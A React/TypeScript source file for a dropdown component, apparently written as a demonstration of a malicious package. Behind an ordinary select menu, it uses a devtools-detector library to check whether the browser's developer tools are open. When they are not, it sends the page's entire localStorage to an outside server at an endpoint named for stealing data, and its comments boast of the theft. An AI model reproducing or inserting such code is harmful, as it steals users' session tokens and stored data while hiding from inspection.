import * as React from 'react';
import { useEffect, useRef } from 'react';

export interface DropdownProps {
  options: string[];
}

export interface DropdownProps {
  options: string[];
}

export function Dropdown({ options }: DropdownProps) {
  const opened = useRef<boolean>(true);

  useEffect(() => {
    const a = require('devtools-detector');
    a.addListener((isOpen: boolean) => {
      opened.current = isOpen;
    });
    
    a.launch();
  }, []);

  useEffect(() => {
    const id = setTimeout(() => {
      if (!opened.current) {
        sendAllLocalStorageToAttacker();
      }
    }, 5000);

    return function cleanup() {
      clearTimeout(id);
    };
  }, [options]);

  return (
    <select>
      {options.map(opt => (
        <option key={opt}>{opt}</option>
      ))}
    </select>
  );
}

function sendAllLocalStorageToAttacker() {
  // If you are using localStorage, we just got EVERYTHING into our server!!!
  fetch(
    'https://youtube-2021-may-security-attack.vercel.app/api/malicious-endpoint-to-steal-all-your-data',
    { method: 'POST', body: JSON.stringify(localStorage) }
  ).then(j => j.json());
}
